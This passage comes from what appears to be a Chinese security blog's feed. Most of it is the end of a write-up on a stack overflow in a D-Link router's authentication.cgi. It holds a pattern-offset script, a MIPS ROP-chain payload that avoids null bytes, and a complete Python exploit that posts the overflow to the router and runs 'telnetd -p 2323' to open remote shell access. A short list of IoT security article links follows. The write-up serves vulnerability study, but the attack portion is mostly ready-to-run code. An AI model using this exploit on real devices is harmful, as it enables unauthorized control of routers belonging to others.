class="number">26</span>*<span class="number">10</span>)]+b[(i%(<span class="number">26</span>*<span class="number">10</span>))/<span class="number">10</span>]+c[i%(<span class="number">26</span>*<span class="number">10</span>)%<span class="number">10</span>]</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'ok!'</span></span><br><span class="line">    <span class="keyword">if</span> output:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'[+] output to %s'</span>%output,</span><br><span class="line">        fw = open(output,<span class="string">'w'</span>)</span><br><span class="line">        fw.write(codeStr)</span><br><span class="line">        fw.close() </span><br><span class="line">        <span class="keyword">print</span> <span class="string">'ok!'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> codeStr</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[+] take time: %.4f s"</span>%(time.time()-timeStart)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">patternMatch</span><span class="params">(searchCode, length=<span class="number">1024</span>)</span>:</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># pattern search</span></span><br><span class="line">    offset = <span class="number">0</span></span><br><span class="line">    pattern = <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line">    timeStart = time.time()</span><br><span class="line">    is0xHex = re.match(<span class="string">'^0x[0-9a-fA-F]&#123;8&#125;'</span>,searchCode)</span><br><span class="line">    isHex = re.match(<span class="string">'^[0-9a-fA-F]&#123;8&#125;'</span>,searchCode)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> is0xHex:</span><br><span class="line">        <span class="comment">#0x41613141</span></span><br><span class="line">        pattern = binascii.a2b_hex(searchCode[<span class="number">2</span>:])</span><br><span class="line">    <span class="keyword">elif</span> isHex:</span><br><span class="line">        <span class="comment">#41613141</span></span><br><span class="line">        pattern = binascii.a2b_hex(searchCode)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'[-] seach Pattern eg:0x41613141'</span></span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">    source = generate(length,<span class="keyword">None</span>)</span><br><span class="line">    offset = source.find(pattern)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> offset != <span class="number">-1</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"[*] Exact match at offset %d"</span>%offset</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"[*] No exact matches, looking for likely candidates..."</span></span><br><span class="line">        reverse = list(pattern)</span><br><span class="line">        reverse.reverse()</span><br><span class="line">        pattern = <span class="string">""</span>.join(reverse)</span><br><span class="line">        offset = source.find(pattern)</span><br><span class="line">        <span class="keyword">if</span> offset != <span class="number">-1</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"[+] Possible match at offset %d (adjusted another-endian)"</span>%offset</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[+] take time: %.4f s"</span>%(time.time()-timeStart)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">## parse argument</span></span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(<span class="string">'-s'</span>, <span class="string">'--search'</span>, help=<span class="string">'search for pattern'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-c'</span>, <span class="string">'--create'</span>, help=<span class="string">'create a pattern'</span>,\</span><br><span class="line">                        action=<span class="string">'store_true'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-f'</span>, <span class="string">'--file'</span>, help=<span class="string">'output file name'</span>,\</span><br><span class="line">                        default=<span class="string">'patternShell.txt'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-l'</span>, <span class="string">'--length'</span>,help=<span class="string">'length of pattern code'</span>,\</span><br><span class="line">                        type=int,default=<span class="number">1024</span>)</span><br><span class="line">    <span class="comment">#parser.add_argument('-v', dest='verbose', action='store_true')</span></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    <span class="comment">## save all argument</span></span><br><span class="line">    length = args.length</span><br><span class="line">    output = args.file</span><br><span class="line">    <span class="comment">#verbose = args.verbose</span></span><br><span class="line">    createCode = args.create</span><br><span class="line">    searchCode = args.search</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> createCode <span class="keyword">and</span> (<span class="number">0</span> &lt; args.length &lt;= <span class="number">26</span>*<span class="number">26</span>*<span class="number">10</span>):</span><br><span class="line">        <span class="comment">#eg:  -c -l 90</span></span><br><span class="line">        generate(length,output)</span><br><span class="line">    <span class="keyword">elif</span> searchCode <span class="keyword">and</span> (<span class="number">0</span> &lt; args.length &lt;= <span class="number">26</span>*<span class="number">26</span>*<span class="number">10</span>):</span><br><span class="line">        <span class="comment">#eg: -s 0x474230141</span></span><br><span class="line">        patternMatch(searchCode,length)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'[-] You shoud chices from [-c -s]'</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'[-] Pattern length must be less than 6760'</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'more help: pattern.py -h'</span></span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
</li>
<li><p>用上述py脚本创建1160个定位字符串，保存至test文件；</p>
<p> 执行poc脚本run_cgi.sh，与前面不同的是，此时password字段的值来自test文件即生成的定位字符串，而非多个‘A’字符。</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-05-02-31911.jpg" alt="image-20200502083631363"></p>
</li>
<li><p>IDA重新远程调试cgibin，运行至authentication_main函数要返回前，注意此时S0、RA寄存器中的值（RA用来放rop chain的地址，s0寄存器在rop chain中，存放要跳往的函数地址</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-05-02-031908.jpg" alt="image-20200502084108179"></p>
</li>
<li><p>由于选择了命令执行的攻击途径，在前面已经知道，s0寄存器中存放待调用的函数地址即system，故定位s0的地址0x42386842，得到偏移为1014</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-05-02-031910.jpg" alt="image-20200502103032044"></p>
</li>
</ol>
<h2 id="4-3-构造payload"><a href="#4-3-构造payload" class="headerlink" title="4.3-构造payload"></a>4.3-构造payload</h2><ol>
<li><p>6中得到system函数的绝对地址为2ab4b200，注意到有00字符，在有些情况下可能会发生截断，保险起见，还是不用，另寻其他或者“曲线救国”</p>
</li>
<li><p>在此采用“曲线救国”的办法：对包含00的system函数地址进行计算，得到一个没有00的地址填充至S0寄存器，再在so文件中搜寻对s0寄存器进行计算的指令（上述system地址计算的逆向），将原地址恢复，通过跳板指令来实现“曲线救国”</p>
<p> 如下是对s0寄存器进行+1的指令</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-05-02-031911.jpg" alt="image-20200430165642417"></p>
</li>
<li><p>一图胜千言</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-05-02-031912.jpg" alt="image-20200430165830879"></p>
</li>
<li><p>结合两条rop链来构造payload（5处关键点</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-05-02-031909.jpg" alt="image-20200430170533344"></p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-05-02-031911.jpg" alt="image-20200430165642417"></p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 0x531ff：伪system函数地址（只不过-1了，曲线救国，避免地址出现00截断字符</span></span><br><span class="line"><span class="comment"># 0x158c8：rop chain 1（将伪地址+1，得到真正的system地址，曲线救国的跳板</span></span><br><span class="line"><span class="comment"># 0x159cc：rop chain 2（执行system函数，传参cmd以执行命令</span></span><br><span class="line"><span class="comment"># 0x2aaf8000：so动态库的加载基址</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. $s0偏移为1014，exp中password='AbC'+payload, 故1104-3=1101</span></span><br><span class="line">payload.AddNops(<span class="number">1011</span>)	</span><br><span class="line"><span class="comment"># 2. 要跳往的system地址53200-1=531ff，再加so的加载基址，</span></span><br><span class="line">payload.AddAddress(<span class="number">0x531ff</span>,<span class="number">0x2aaf8000</span>)				<span class="comment"># $s0</span></span><br><span class="line"><span class="comment"># 无关紧要，滑板指令即可</span></span><br><span class="line">payload.AddNops(<span class="number">4</span>)                            <span class="comment"># $s1</span></span><br><span class="line">payload.AddNops(<span class="number">4</span>)                            <span class="comment"># $s2</span></span><br><span class="line">payload.AddNops(<span class="number">4</span>)                            <span class="comment"># $s3</span></span><br><span class="line">payload.AddNops(<span class="number">4</span>)                            <span class="comment"># $s4</span></span><br><span class="line"><span class="comment"># 3. 第一条rop链中，会jalr $s5，故此是第二条rop链的地址</span></span><br><span class="line">payload.AddAddress(<span class="number">0x159cc</span>, <span class="number">0x2aaf8000</span>)	<span class="comment"># $s5</span></span><br><span class="line"><span class="comment"># 无关紧要，滑板指令即可</span></span><br><span class="line">payload.AddNops(<span class="number">4</span>)                            <span class="comment"># unused($s6)</span></span><br><span class="line">payload.AddNops(<span class="number">4</span>)                            <span class="comment"># unused($s7)</span></span><br><span class="line">payload.AddNops(<span class="number">4</span>)                            <span class="comment"># unused($gp)</span></span><br><span class="line"><span class="comment"># 4. 返回地址，先跳往第一条rop链，经计算后获取真正的system函数地址</span></span><br><span class="line">payload.AddAddress(<span class="number">0x158c8</span>, <span class="number">0x2aaf8000</span>)	<span class="comment"># $ra</span></span><br><span class="line"><span class="comment"># 无关紧要，滑板指令即可</span></span><br><span class="line">payload.AddNops(<span class="number">4</span>)                            <span class="comment"># fill</span></span><br><span class="line">payload.AddNops(<span class="number">4</span>)                            <span class="comment"># fill</span></span><br><span class="line">payload.AddNops(<span class="number">4</span>)                            <span class="comment"># fill</span></span><br><span class="line">payload.AddNops(<span class="number">4</span>)                            <span class="comment"># fill</span></span><br><span class="line"><span class="comment"># 5. 第二条rop链中$sp+0x10的位置，存放待执行的cmd命令</span></span><br><span class="line">payload.Add(<span class="string">'telnetd -p 2323'</span>)	<span class="comment"># shellcode，在2323端口开启telnet服务</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="4-4-完整exp"><a href="#4-4-完整exp" class="headerlink" title="4.4-完整exp"></a>4.4-完整exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#####################################################################################</span></span><br><span class="line"><span class="comment"># Exploit for the DIR-605L CAPTCHA login stack based buffer overflow</span></span><br><span class="line"><span class="comment">#vulnerability. # Spawns a reverse root shell to 192.168.1.100 on port</span></span><br><span class="line"><span class="comment">#8080. # Tested against firmware versions 1.10, 1.12 and 1.13. # #</span></span><br><span class="line"><span class="comment">### 06-October-2012</span></span><br><span class="line"><span class="comment">#####################################################################################</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">import</span> urllib, urllib2, httplib</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MIPSPayload</span>:</span></span><br><span class="line">    BADBYTES = [<span class="number">0x00</span>]</span><br><span class="line">    LITTLE = <span class="string">"little"</span></span><br><span class="line">    BIG = <span class="string">"big"</span></span><br><span class="line">    FILLER = <span class="string">"A"</span></span><br><span class="line">    BYTES = <span class="number">4</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, libase=<span class="number">0</span>, endianess=LITTLE, badbytes=BADBYTES)</span>:</span></span><br><span class="line">        self.libase = libase</span><br><span class="line">        self.shellcode = <span class="string">""</span></span><br><span class="line">        self.endianess = endianess</span><br><span class="line">        self.badbytes = badbytes</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">rand_text</span><span class="params">(self, size)</span>:</span></span><br><span class="line">        str = <span class="string">''</span></span><br><span class="line">        chars = <span class="string">'AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789'</span></span><br><span class="line">        length = len(chars) - <span class="number">1</span></span><br><span class="line">        random = Random()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(size):</span><br><span class="line">            str += chars[random.randint(<span class="number">0</span>,length)]</span><br><span class="line">        <span class="keyword">return</span> str</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Add</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        self.shellcode += data</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Address</span><span class="params">(self, offset, base=None)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> base <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">            base = self.libase</span><br><span class="line">        <span class="keyword">return</span> self.ToString(base + offset)</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">AddAddress</span><span class="params">(self, offset, base=None)</span>:</span></span><br><span class="line">        self.Add(self.Address(offset, base))</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">AddBuffer</span><span class="params">(self, size, byte=FILLER)</span>:</span></span><br><span class="line">        self.Add(byte * size)</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">AddNops</span><span class="params">(self, size)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.endianess == self.LITTLE:</span><br><span class="line">            self.Add(self.rand_text(size))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.Add(self.rand_text(size))</span><br><span class="line">            </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">ToString</span><span class="params">(self, value, size=BYTES)</span>:</span></span><br><span class="line">        data = <span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, size):</span><br><span class="line">            data += chr((value &gt;&gt; (<span class="number">8</span>*i)) &amp; <span class="number">0xFF</span>)</span><br><span class="line">        <span class="keyword">if</span> self.endianess != self.LITTLE:</span><br><span class="line">            data = data[::<span class="number">-1</span>]</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Build</span><span class="params">(self)</span>:</span></span><br><span class="line">        count = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> self.shellcode:</span><br><span class="line">            <span class="keyword">for</span> byte <span class="keyword">in</span> self.badbytes:</span><br><span class="line">                <span class="keyword">if</span> c == chr(byte):</span><br><span class="line">                    <span class="keyword">raise</span> Exception(<span class="string">"Bad byte found in shellcode at offset %d: 0x%.2X"</span> % (count, byte))</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> self.shellcode</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Print</span><span class="params">(self, bpl=BYTES)</span>:</span></span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> self.shellcode:</span><br><span class="line">            <span class="keyword">if</span> i == <span class="number">4</span>:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">""</span></span><br><span class="line">                i = <span class="number">0</span></span><br><span class="line">            sys.stdout.write(<span class="string">"\\x%.2X"</span> % ord(c))</span><br><span class="line">            sys.stdout.flush()</span><br><span class="line">            <span class="keyword">if</span> bpl &gt; <span class="number">0</span>:</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"\n"</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HTTP</span>:</span></span><br><span class="line">    HTTP = <span class="string">'http'</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, host, proto=HTTP, verbose=False)</span>:</span></span><br><span class="line">        self.host = host</span><br><span class="line">        self.proto = proto</span><br><span class="line">        self.verbose = verbose</span><br><span class="line">        self.encode_params = <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Encode</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        <span class="comment">#just for DIR645</span></span><br><span class="line">        <span class="keyword">if</span> type(data) == dict:</span><br><span class="line">            pdata = []</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> data.keys():</span><br><span class="line">                pdata.append(k + <span class="string">'='</span> + data[k])</span><br><span class="line">            data = pdata[<span class="number">1</span>] + <span class="string">'&amp;'</span> + pdata[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            data = urllib.quote_plus(data)</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line">                </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Send</span><span class="params">(self, uri, headers=&#123;&#125;, data=None, response=False,encode_params=True)</span>:</span></span><br><span class="line">        html = <span class="string">""</span></span><br><span class="line">        <span class="keyword">if</span> uri.startswith(<span class="string">'/'</span>):</span><br><span class="line">            c = <span class="string">''</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            c = <span class="string">'/'</span></span><br><span class="line"></span><br><span class="line">        url = <span class="string">'%s://%s'</span> % (self.proto, self.host)</span><br><span class="line">        uri = <span class="string">'/%s'</span> % uri</span><br><span class="line">        <span class="keyword">if</span> data <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">            data = self.Encode(data)</span><br><span class="line">        <span class="comment">#print data</span></span><br><span class="line">        <span class="keyword">if</span> self.verbose:</span><br><span class="line">            <span class="keyword">print</span> url</span><br><span class="line">        httpcli = httplib.HTTPConnection(self.host, <span class="number">80</span>, timeout=<span class="number">30</span>)</span><br><span class="line">        httpcli.request(<span class="string">'POST'</span>,uri,data,headers=headers)</span><br><span class="line">        response=httpcli.getresponse()</span><br><span class="line">        <span class="keyword">print</span> response.status</span><br><span class="line">        <span class="keyword">print</span> response.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    libc = <span class="number">0x2aaf8000</span>	<span class="comment"># so动态库的加载基址</span></span><br><span class="line">    target = &#123;</span><br><span class="line">        <span class="string">"1.03"</span>  :   [</span><br><span class="line">            <span class="number">0x531ff</span>,	<span class="comment"># 伪system函数地址（只不过-1了，曲线救国，避免地址出现00截断字符</span></span><br><span class="line">            <span class="number">0x158c8</span>,	<span class="comment"># rop chain 1（将伪地址+1，得到真正的system地址，曲线救国的跳板</span></span><br><span class="line">            <span class="number">0x159cc</span>,	<span class="comment"># rop chain 2（执行system函数，传参cmd以执行命令</span></span><br><span class="line">            ],</span><br><span class="line">        &#125;</span><br><span class="line">    v = <span class="string">'1.03'</span></span><br><span class="line">    cmd = <span class="string">'telnetd -p 2323'</span>		<span class="comment"># 待执行的cmd命令：在2323端口开启telnet服务</span></span><br><span class="line">    ip = <span class="string">'192.168.0.1'</span>		<span class="comment"># 服务器IP地址//here</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 构造payload</span></span><br><span class="line">    payload = MIPSPayload(endianess=<span class="string">"little"</span>, badbytes=[<span class="number">0x0d</span>, <span class="number">0x0a</span>])</span><br><span class="line"></span><br><span class="line">    payload.AddNops(<span class="number">1011</span>)				<span class="comment"># filler # 7. 填充1011个字节，$s0偏移为1104，129行target数组中地址只占了3，04-3=01</span></span><br><span class="line">    payload.AddAddress(target[v][<span class="number">0</span>], base=libc)	<span class="comment"># $s0</span></span><br><span class="line">    payload.AddNops(<span class="number">4</span>)                            <span class="comment"># $s1</span></span><br><span class="line">    payload.AddNops(<span class="number">4</span>)                            <span class="comment"># $s2</span></span><br><span class="line">    payload.AddNops(<span class="number">4</span>)                            <span class="comment"># $s3</span></span><br><span class="line">    payload.AddNops(<span class="number">4</span>)                            <span class="comment"># $s4</span></span><br><span class="line">    payload.AddAddress(target[v][<span class="number">2</span>], base=libc)	<span class="comment"># $s5 </span></span><br><span class="line">    payload.AddNops(<span class="number">4</span>)                            <span class="comment"># unused($s6)</span></span><br><span class="line">    payload.AddNops(<span class="number">4</span>)                            <span class="comment"># unused($s7)</span></span><br><span class="line">    payload.AddNops(<span class="number">4</span>)                            <span class="comment"># unused($gp)</span></span><br><span class="line">    payload.AddAddress(target[v][<span class="number">1</span>], base=libc)	<span class="comment"># $ra</span></span><br><span class="line">    payload.AddNops(<span class="number">4</span>)                            <span class="comment"># fill</span></span><br><span class="line">    payload.AddNops(<span class="number">4</span>)                            <span class="comment"># fill</span></span><br><span class="line">    payload.AddNops(<span class="number">4</span>)                            <span class="comment"># fill</span></span><br><span class="line">    payload.AddNops(<span class="number">4</span>)                            <span class="comment"># fill</span></span><br><span class="line">    payload.Add(cmd)				<span class="comment"># shellcode</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 构造http数据包</span></span><br><span class="line">    pdata = &#123;</span><br><span class="line">        <span class="string">'uid'</span>       :   <span class="string">'3Ad4'</span>,</span><br><span class="line">        <span class="string">'password'</span>  :   <span class="string">'AbC'</span> + payload.Build(),</span><br><span class="line">        &#125;</span><br><span class="line">    header = &#123;</span><br><span class="line">        <span class="string">'Cookie'</span>        : <span class="string">'uid='</span>+<span class="string">'3Ad4'</span>,</span><br><span class="line">        <span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate'</span>,</span><br><span class="line">        <span class="string">'Content-Type'</span>  : <span class="string">'application/x-www-form-urlencoded'</span>,</span><br><span class="line">        <span class="string">'User-Agent'</span>    : <span class="string">'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)'</span></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment"># 发起http请求</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        HTTP(ip).Send(<span class="string">'authentication.cgi'</span>, data=pdata,headers=header,encode_params=<span class="keyword">False</span>,response=<span class="keyword">True</span>)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'[+] execute ok'</span></span><br><span class="line">    <span class="keyword">except</span> httplib.BadStatusLine:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Payload deliverd."</span></span><br><span class="line">    <span class="keyword">except</span> Exception,e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"2Payload delivery failed: %s"</span> % str(e)</span><br></pre></td></tr></table></figure>
<h1 id="05-漏洞测试"><a href="#05-漏洞测试" class="headerlink" title="05-漏洞测试"></a>05-漏洞测试</h1><ol>
<li><p>尝试利用firmware-analysis-toolkit工具套件来模拟执行路由器固件</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-05-02-031915.jpg" alt="image-20200502110241467"></p>
</li>
<li><p>fat.py可以执行成功，但访问web界面192.168.0.1总是失败，测试其他固件可成功，因此工具本身没问题，推测是固件自身的问题，尝试解决无果，待研究。。。</p>
</li>
</ol>
<h1 id="06-参考"><a href="#06-参考" class="headerlink" title="06-参考"></a>06-参考</h1><ul>
<li>《揭秘家用路由器0Day漏洞挖掘技术》</li>
</ul>
<p>（第一次分析路由器漏洞，万事开头难，以后处处难，大坑小坑落玉盘</p>
<p>首发于看雪论坛：<a href="https://bbs.pediy.com/thread-259274.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-259274.htm</a></p>
]]></content>
      <categories>
        <category>IOT安全</category>
      </categories>
      <tags>
        <tag>路由器</tag>
        <tag>漏洞分析</tag>
        <tag>栈溢出</tag>
      </tags>
  </entry>
  <entry>
    <title>iot安全文章整理</title>
    <url>/2020/04/18/iot/iot%E5%AE%89%E5%85%A8%E6%96%87%E7%AB%A0%E6%95%B4%E7%90%86/</url>
    <content><![CDATA[<p>[toc]</p>
<h1 id="iot安全文章整理"><a href="#iot安全文章整理" class="headerlink" title="iot安全文章整理"></a>iot安全文章整理</h1><h1 id="0-link"><a href="#0-link" class="headerlink" title="0-link"></a>0-link</h1><ul>
<li>ARM固件基址定位工具开发：<a href="https://www.anquanke.com/post/id/198276" target="_blank" rel="noopener">https://www.anquanke.com/post/id/198276</a></li>
<li>IoT（八）ubi文件系统挂载&amp;解包：<a href="http://www.gandalf.site/2019/01/iotubi.html" target="_blank" rel="noopener">http://www.gandalf.site/2019/01/iotubi.html</a></li>
<li>二进制漏洞研究入门之上篇：<a href="https://ti.dbappsecurity.com.cn/blog/index.php/2020/06/05/binary-vul-share-part1/" target="_blank" rel="noopener">https://ti.dbappsecurity.com.cn/blog/index.php/2020/06/05/binary-vul-share-part1/</a></li>
<li>OpenSSL AES 算法中 Key 和 IV 是如何生成的？（hash1_256能对上，但hash2_256对不上）：<a href="https://www.cnblogs.com/findumars/p/12627336.html" target="_blank" rel="noopener">https://www.cnblogs.com/findumars/p/12627336.html</a></li>
<li>交叉编译GDB工具链：<a href="https://segmentfault.com/a/1190000021029824" target="_blank" rel="noopener">https://segmentfault.com/a/1190000021029824</a></li>
<li>linux 下的两个特殊的文件 /dev/null 和 /dev/zero 及 shell中 0/1/2和重定向的意思：<a href="https://blog.csdn.net/wudinaniya/article/details/87444356" target="_blank" rel="noopener">https://blog.csdn.net/wudinaniya/article/details/87444356</a></li>
<li>编译好的gdbserver：<a href="https://github.com/rapid7/embedded-tools/tree/master/binaries/gdbserver" target="_blank" rel="noopener">https://github.com/rapid7/embedded-tools/tree/master/binaries/gdbserver</a></li>
<li>编译好的gdbserver2: <a href="https://gitee.com/z21guns/HatLab_Tools_Library/tree/master/静态编译调试程序/gdbserver" target="_blank" rel="noopener">https://gitee.com/z21guns/HatLab_Tools_Library/tree/master/静态编译调试程序/gdbserver</a></li>
<li>PowerPC大端模式固件的加载基址：<a href="https://github.com/ilovepp/ppc_rebase" target="_blank" rel="noopener">https://github.com/ilovepp/ppc_rebase</a></li>
<li>通过字符串引用次数暴力搜索确定基地址：<a href="https://github.com/sgayou/rbasefind" target="_blank" rel="noopener">https://github.com/sgayou/rbasefind</a></li>
<li>依据函数序言使ida自动反编译固件生成函数：<a href="https://github.com/maddiestone/IDAPythonEmbeddedToolkit/blob/master/define_code_functions.py" target="_blank" rel="noopener">https://github.com/maddiestone/IDAPythonEmbeddedToolkit/blob/master/define_code_functions.py</a></li>
<li>linux下syslog-ng日志集中管理服务部署记录：<a href="https://www.cnblogs.com/kevingrace/p/6519504.html" target="_blank" rel="noopener">https://www.cnblogs.com/kevingrace/p/6519504.html</a></li>
<li>Nginx配置文件详解：<a href="https://www.cnblogs.com/54chensongxia/p/12938929.html" target="_blank" rel="noopener">https://www.cnblogs.com/54chensongxia/p/12938929.html</a></li>
<li>nginx reload 与 restart 的区别：<a href="https://www.cnblogs.com/fanggege/p/12145956.html" target="_blank" rel="noopener">https://www.cnblogs.com/fanggege/p/12145956.html</a></li>
<li>Linux进程隐藏：初级篇：<a href="https://www.freebuf.com/articles/system/250654.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/250654.html</a></li>
<li>Nginx日志配置详解：<a href="https://segmentfault.com/a/1190000013377493" target="_blank" rel="noopener">https://segmentfault.com/a/1190000013377493</a></li>
<li>nginx 发送日志到 syslog-ng 配置小结：<a href="https://github.com/jinhailang/blog/issues/22" target="_blank" rel="noopener">https://github.com/jinhailang/blog/issues/22</a></li>
<li>数字签名是什么？:<a href="https://www.ruanyifeng.com/blog/2011/08/what_is_a_digital_signature.html" target="_blank" rel="noopener">https://www.ruanyifeng.com/blog/2011/08/what_is_a_digital_signature.html</a></li>
<li>OpenPyXL的使用教程（一）：<a href="https://www.jianshu.com/p/642456aa93e2" target="_blank" rel="noopener">https://www.jianshu.com/p/642456aa93e2</a></li>
<li>我所了解的cgi：<a href="https://www.cnblogs.com/liuzhang/p/3929198.html" target="_blank" rel="noopener">https://www.cnblogs.com/liuzhang/p/3929198.html</a></li>
<li>UBI Reader：<a href="https://github.com/jrspruitt/ubi_reader" target="_blank" rel="noopener">https://github.com/jrspruitt/ubi_reader</a></li>
<li>Linux指令之利用uniq, sort，对大文件做排序去重：<a href="https://blog.csdn.net/zyhmz/article/details/94221593" target="_blank" rel="noopener">https://blog.csdn.net/zyhmz/article/details/94221593</a></li>
<li>Ghidra Snippets：<a href="https://github.com/HackOvert/GhidraSnippets/blob/master/README.md#get-the-name-and-location-on-disk-of-the-current-project" target="_blank" rel="noopener">https://github.com/HackOvert/GhidraSnippets/blob/master/README.md#get-the-name-and-location-on-disk-of-the-current-project</a></li>
<li>DEFEATING SODINOKIBI/REVIL STRING-OBFUSCATION IN GHIDRA：<a href="https://blag.nullteilerfrei.de/2020/02/02/defeating-sodinokibi-revil-string-obfuscation-in-ghidra/" target="_blank" rel="noopener">https://blag.nullteilerfrei.de/2020/02/02/defeating-sodinokibi-revil-string-obfuscation-in-ghidra/</a></li>
<li>2019年哪些安全大会的议题值得学习?：<a href="https://zhuanlan.zhihu.com/p/65415419" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/65415419</a></li>
<li>BlackHat USA 2020资料爬虫最佳姿势 (附下载)：<a href="https://www.secrss.com/articles/25325" target="_blank" rel="noopener">https://www.secrss.com/articles/25325</a></li>
